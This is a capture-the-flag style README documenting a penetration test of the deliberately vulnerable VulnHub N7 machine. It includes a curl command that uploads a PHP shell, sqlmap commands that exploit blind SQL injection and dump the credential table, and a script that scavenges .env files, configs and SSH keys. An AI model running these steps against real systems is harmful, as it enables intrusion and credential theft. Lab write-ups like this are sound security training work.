## 📌 About This Lab

This repository documents the full penetration test and data exfiltration of **[Web Machine: (N7)](https://www.vulnhub.com/entry/web-machine-n7,756/)** — a purposely vulnerable VM created by **Duty Mastr**, released **November 3, 2021**.

The engagement utilized a custom exploitation framework, [**bubble_siphon**](https://github.com/MoriartyPuth/bubble-siphon), to profile the host, uncover hidden entry points, and siphon sensitive credentials and flags from the underlying database.

| Field | Details |
|---|---|
| 🖥️ Machine Name | Web Machine: (N7) |
| ⚡ Difficulty | Medium |
| 📦 Format | VirtualBox OVA |
| 🐧 OS | Linux |
| 🌐 Network | DHCP / Bridged |
| 🎯 Primary Vector | Web-based vulnerabilities |
| 🏆 Flag | `FLAG{N7:KSA_01}` |

## 🗺️ Attack Chain

```
[Host Discovery] → [Port Scan] → [Directory Fuzzing] → [Hidden Portal]
      → [Upload Bypass + curl] → [Partial Flag] → [Blind SQLi]
            → [DB Dump] → [Credential Recovery] → [FLAG 🏆]
```

## 🛠️ Methodology

### 1️⃣ Network Enumeration & Target Validation

The lab was configured with **bridged networking** for direct host-to-host communication between the Kali attacker machine and the target VM.

```bash
# Host discovery
sudo arp-scan -l
```

![Host Discovery](https://github.com/user-attachments/assets/27c18f5c-a492-451e-9bcb-7c26a4dce983)

```bash
# Full service scan
nmap -sCV -T4 <TARGET_IP>
```

> 📡 Result: **Port 80 (HTTP)** was the sole open port — the entire attack surface.

---

### 2️⃣ Directory & Parameter Fuzzing

Initial scans with standard wordlists returned minimal results. Escalating to an aggressive, custom dictionary with **DirBuster** eventually cracked it open.

![Fuzzing](https://github.com/user-attachments/assets/1643e951-c524-4c56-a39a-8689069d2f48)

**Key endpoints discovered:**

| Endpoint | Purpose |
|---|---|
| `/exploit.html` | Hidden upload form |
| `/enter_network` | Administrative login gateway |

---

### 3️⃣ Exploitation & Lateral Movement

#### 🔓 Upload Form Bypass

The `/exploit.html` upload form was misconfigured — its action pointed to `localhost`, making browser-based submission useless. This was trivially bypassed by crafting a direct `POST` request to the backend handler.

```bash
curl -X POST http://<TARGET_IP>/profile.php \
  -F "file=@shell.php" \
  -v
```

![curl exploit](https://github.com/user-attachments/assets/fc7121a4-3c2f-4ef4-af13-29e649fbc2ac)

> 💬 Interacting with `profile.php` directly triggered a **partial flag disclosure**: `FLAG{N7`

---

#### 💉 Blind SQL Injection via `/enter_network`

The login form at `/enter_network` was found vulnerable to SQL injection on the `user` parameter. Time-based blind injection was confirmed using `sqlmap` at elevated risk and level settings.

```bash
sqlmap -u "http://<TARGET_IP>/enter_network/index.php" \
  --data="user=admin&pass=admin" \
  --level 3 \
  --risk 3 \
  --dbms=mysql \
  --batch
```

![SQLmap](https://github.com/user-attachments/assets/95a2d0a5-df9e-4a55-9f9b-facddd54961e)

---

### 4️⃣ Post-Exploitation & Data Siphoning

#### 🗄️ Database Exfiltration

With injection confirmed, `sqlmap` was pointed at the **Machine** database to dump the `login` table.

```bash
sqlmap -u "http://<TARGET_IP>/enter_network/index.php" \
  --data="user=admin&pass=admin" \
  -D Machine \
  -T login \
  --dump \
  --batch
```

![DB Dump](https://github.com/user-attachments/assets/c79f9a07-1bfd-4cc3-b950-35f652f23ba7)

> 🎯 The **final flag** and **admin credentials** were recovered from the `password` field of the `login` table.

---

#### 🫧 bubble_siphon Deployment

The custom **`bubble_siphon.sh`** framework was deployed post-compromise to scavenge the web root for configuration secrets.

```bash
# Profile the web server identity
whoami        # → www-data

# Scavenge /var/www/ for config secrets
./bubble_siphon.sh --target /var/www/ --hunt .env,config.php
```

Artifacts targeted for extraction: `.env` files, `config.php`, SSH keys, and any hardcoded credentials within the web directory.
